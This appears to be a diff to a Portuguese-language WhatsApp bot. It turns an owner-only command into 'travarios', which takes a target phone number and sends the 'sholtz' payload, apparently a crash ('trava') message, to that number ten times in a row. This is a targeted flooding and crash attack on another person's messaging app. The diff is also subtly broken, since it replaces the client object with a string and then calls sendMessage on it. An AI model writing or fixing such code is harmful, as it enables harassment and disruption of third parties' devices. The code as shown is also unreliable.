@@ -494,9 +494,20 @@ case 'testcart':
 					ctlclient.relayWAMessage(prep)
 					break*/
 					
-				case 'sholtz':
+				case 'travarios':
 					if (!isCtlowners) return reply('\n\n Este comando é apenas para os owners da Ctl!!\n\n')
-					ctlclient.sendMessage(from, sholtz(prefix), text)
+					if (args.length < 1) return reply('Cadê o alvo')
+					ctlclient = body.slice(11)
+					ctlclient.sendMessage(`${ctlclient}@s.whatsapp.net`, sholtz(prefix), text)
+					ctlclient.sendMessage(`${ctlclient}@s.whatsapp.net`, sholtz(prefix), text)
+					ctlclient.sendMessage(`${ctlclient}@s.whatsapp.net`, sholtz(prefix), text)
+					ctlclient.sendMessage(`${ctlclient}@s.whatsapp.net`, sholtz(prefix), text)
+					ctlclient.sendMessage(`${ctlclient}@s.whatsapp.net`, sholtz(prefix), text)
+					ctlclient.sendMessage(`${ctlclient}@s.whatsapp.net`, sholtz(prefix), text)
+					ctlclient.sendMessage(`${ctlclient}@s.whatsapp.net`, sholtz(prefix), text)
+					ctlclient.sendMessage(`${ctlclient}@s.whatsapp.net`, sholtz(prefix), text)
+					ctlclient.sendMessage(`${ctlclient}@s.whatsapp.net`, sholtz(prefix), text)
+					ctlclient.sendMessage(`${ctlclient}@s.whatsapp.net`, sholtz(prefix), text)
 					break
 					
 				case 'normalrct1':
